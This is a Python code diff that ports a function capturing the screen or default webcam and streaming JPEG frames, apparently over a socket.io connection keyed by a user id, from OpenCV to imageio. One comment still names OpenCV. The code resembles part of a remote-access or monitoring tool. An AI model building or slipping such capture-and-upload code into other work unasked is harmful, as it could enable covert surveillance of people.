@@ -14,7 +14,7 @@ import io
 import os
 import re
 import zlib
-import cv2  # Import OpenCV for camera access
+import imageio  # Import OpenCV for camera access
 
 # Platform check for GUI libraries
 if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
@@ -339,26 +339,28 @@ def run(data):
                         # Small sleep to prevent a tight loop
                         time.sleep(0.001)
         else:
-            # Use OpenCV to capture from the camera instead of the screen
-            cap = cv2.VideoCapture(0)  # 0 is the default camera device index
-
-            if not cap.isOpened():
-                print("Error: Could not open camera.")
+            # Use imageio to capture from the camera instead of OpenCV
+            try:
+                try:
+                    cap = imageio.get_reader('<video0>')  # Default webcam device on Linux, for example
+                except Exception as err:
+                    # On Windows, it could be '<video1>' or use the proper device string for the camera
+                    cap = imageio.get_reader('<video1>')
+            except Exception as e:
+                print(f"Error: Could not open camera: {e}")
                 return
 
             while not stop_event.is_set():
                 current_time = time.time()
                 if current_time - last_capture_time >= frame_interval:
-                    ret, frame = cap.read()
-                    if not ret:
+                    try:
+                        frame = cap.get_next_data()
+                    except StopIteration:
                         print("Failed to capture image from camera")
                         break
 
-                    # Convert the frame (BGR) to RGB
-                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-
                     # Convert the frame to a PIL Image
-                    img = Image.fromarray(frame_rgb)
+                    img = Image.fromarray(frame)
 
                     # Compress to JPEG with adjustable quality
                     with io.BytesIO() as output:
@@ -377,7 +379,7 @@ def run(data):
                     # Small sleep to prevent a tight loop
                     time.sleep(0.001)
 
-            cap.release()
+            cap.close()
 
     screenshot_thread = threading.Thread(
         target=take_screenshots, args=(sio, data["uid"])
